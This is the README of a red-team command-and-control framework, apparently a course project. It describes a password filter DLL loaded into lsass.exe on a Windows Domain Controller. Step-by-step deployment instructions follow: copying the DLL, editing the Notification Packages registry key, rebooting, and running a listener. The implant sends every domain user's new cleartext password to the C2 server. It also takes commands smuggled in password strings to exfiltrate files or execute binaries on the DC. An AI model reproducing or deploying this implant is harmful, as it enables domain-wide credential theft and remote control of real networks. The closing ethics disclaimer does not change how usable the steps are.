# CDT Domain Controller Auth Hook C2
By Cory 

A red-team C2 framework built entirely on DC-resident LSA subsystems — no client-side deployment required. Modeled on the DC-side architecture used by commercial products like AuthLite, all hooks live inside `lsass.exe` on the Domain Controller, meaning any domain user authenticating from any workstation, server, or service triggers the framework.

---

## Architecture Overview

```
Domain Controller (lsass.exe)
├── Password Filter DLL        ← 80% IMPLEMENTED
│     Notification Packages reg key
│     Fires on every domain password change with cleartext credentials
│     Used for: credential harvesting + C2 command channel via crafted passwords
│
├── MSV1_0 Subauthentication   ← IN PROGRESS
│     Called during domain authentication
│     Can accept, reject, or modify the logon decision
│     Used for: account backdoor + C2 dispatch from password field at logon time
│
└── SSP (Security Support Provider) ← IN PROGRESS
      SpAcceptCredentials fires on every successful logon (interactive, RDP, network, service)
      Used for: credential harvesting on every logon type
```

Because all three DLLs load into `lsass.exe` on the DC, coverage is domain-wide with zero client deployment — including non-Windows clients.

---

## What's Implemented

### Password Filter (`src/password_filter/my_password_filter.c`)

Registers as an LSA Notification Package. LSASS calls the filter on every domain password change, passing cleartext credentials before they are hashed and stored.

**Capabilities:**
- Reports credential changes (username + new plaintext password) to the C2 server
- Accepts embedded C2 commands via crafted password strings at change time
- Retry loop on boot — waits for the network stack to come up before connecting
- Local debug logging to `C:\Windows\Temp\cory_debug.txt` for troubleshooting

**C2 Command Channel via Password Field:**

When a password change is submitted in the format `c2:<command>:<arg>`, the filter intercepts it and dispatches the command:

| Command | Format | Effect |
|---|---|---|
| `kill` | `c2:kill:` | Clears all entries from the `Notification Packages` reg key — DLL will not load on next reboot |
| `exfil` | `c2:exfil:<filepath>` | Reads the file at `<filepath>` on the DC and sends contents to the C2 server |
| `exec` | `c2:exec:<filepath>` | Executes the binary at `<filepath>` on the DC |

### C2 Server (`src/c2/server_side.py`)

Python TCP server. Listens for agent connections and logs all received data with timestamps and source IP.

---

## Repository Structure

```
CDT-DOMAIN-CONTROLLER-AUTH-HOOK-C2/
├── Compiled-DLLs/
│   └── cory_filter3.dll          # Compiled password filter
├── helpful_scripts/
│   ├── place_dll.ps1             # Installs DLL + updates registry
│   └── restart_test_env_server.ps1
├── src/
│   ├── c2/
│   │   └── server_side.py        # C2 listener
│   ├── password_filter/
│   │   └── my_password_filter.c  # Password filter source
│   ├── MSV1_0/                   # Subauthentication package (WIP)
│   └── SSP/                      # Security support provider (WIP)
└── README.md
```

---

## Usage

### Step 1 — Start the C2 Server (Ubuntu / Linux)

```bash
cd src/c2
python3 server_side.py
# [2026-05-02 17:30:00] Listening on port 4444...
```

### Step 2 — Deploy the Password Filter on the DC

From an Administrator PowerShell on the Domain Controller:

```powershell
.\helpful_scripts\place_dll.ps1 -DllPath ".\Compiled-DLLs\cory_filter3.dll"
```

This script:
- Copies the DLL to `C:\Windows\System32`
- Updates `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages` to include the filter name
- Prints confirmation

### Step 3 — Reboot the Domain Controller

```powershell
Restart-Computer
```

LSASS loads Notification Packages at boot. After reboot the filter is active and will connect back to the C2 server automatically (retries every 10 seconds until the network is up).

### Step 4 — Trigger a Password Change from a Client

From a Linux/Windows client joined to the domain:

```bash
# Linux
kpasswd targetuser@LAB.LOCAL

# Or via samba-tool
samba-tool user setpassword targetuser --newpassword="NewPass123!" -U administrator
```

The C2 server will log the event:
```
[2026-05-02 17:30:08] Agent connected from 192.168.157.140
[2026-05-02 17:30:08] 192.168.157.140:   PasswordChangeNotify: targetuser / NewPass123!
```

### Step 5 — Send C2 Commands via Password Field

```bash
# Kill the implant (clears registry, DLL won't load after next reboot)
kpasswd targetuser@LAB.LOCAL
# New password: c2:kill:

# Exfil a file from the DC
# New password: c2:exfil:C:\Windows\System32\drivers\etc\hosts

# Execute a binary on the DC
# New password: c2:exec:C:\path\to\binary.exe
```

---

## Verify Deployment

```powershell
# Confirm DLL is loaded in LSASS
Get-Process lsass | Select-Object -ExpandProperty Modules | Where-Object { $_.ModuleName -like "*cory*" }

# Confirm registry entry
(Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa")."Notification Packages"

# Check local debug log
Get-Content "C:\Windows\Temp\cory_debug.txt"
```

---

## My Lab Environment

- **Domain Controller:** Windows Server 2022 — `LAB.LOCAL`
- **C2 Server / Workstation:** Ubuntu `192.168.157.141`
- **Test environment only** — all work performed in assigned lab VMs per course ethics policy

---

## Scope & Ethics

All development and testing was performed exclusively in the assigned lab environment. This framework must not be deployed on any production, shared, or unauthorized system. Submission of this repository implies agreement with the course ethics policy.